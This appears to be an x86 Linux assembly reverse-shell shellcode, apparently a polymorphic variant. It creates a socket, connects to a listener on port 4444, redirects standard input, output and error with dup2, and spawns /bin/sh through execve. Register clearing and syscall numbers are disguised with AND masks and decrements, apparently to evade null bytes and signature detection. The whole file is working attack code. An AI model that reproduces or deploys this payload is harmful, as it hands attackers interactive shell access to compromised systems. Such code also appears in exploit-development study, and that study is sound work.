global _start

section .text
  _start:
    ; set the frame pointer
mov ebp, esp

    ; clear required registers
and eax, 0x01010101
and eax, 0x02020202
and ecx, 0x01010101
and ecx, 0x02020202
sub edx, edx

    ; create sockaddr_in struct
    push  eax
    push  eax             ; [$esp]: 8 bytes of padding
    push eax
    push  word 0x5c11     ; [$esp]: 4444
    push  word 0x02       ; [$esp]: AF_INET

    ; call socket(domain, type, protocol)
and eax, 0x01010101
and eax, 0x02020202
and ebx, 0x01010101
and ebx, 0x02020202
mov ax, 0x168
 dec ax
mov bl, 0x03
 dec bl
mov cl, 0x02
 dec cl
    int   0x80
mov ebx, eax

    ; call connect(sockfd, sockaddr, socklen_t)
mov ax, 0x16b
 dec ax
mov ecx, esp
mov edx, ebp
    sub   edx, esp        ; $ecx: size of the sockaddr struct
    int   0x80

    ; call dup2 to redirect STDIN, STDOUT and STDERR
and ecx, 0x01010101
and ecx, 0x02020202
mov cl, 0x04
 dec cl
    dup:
sub eax, eax
mov al, 0x40
 dec al
    dec   ecx
    int   0x80
    inc   ecx
    loop  dup

    ; spawn /bin/sh using execve
    ; $ecx and $edx are 0 at this point
xor eax, eax
sub edx, edx
    push  eax
    push  0x68732f2f
    push  0x6e69622f
mov ebx, esp
mov al, 0x0c
 dec al
    int   0x80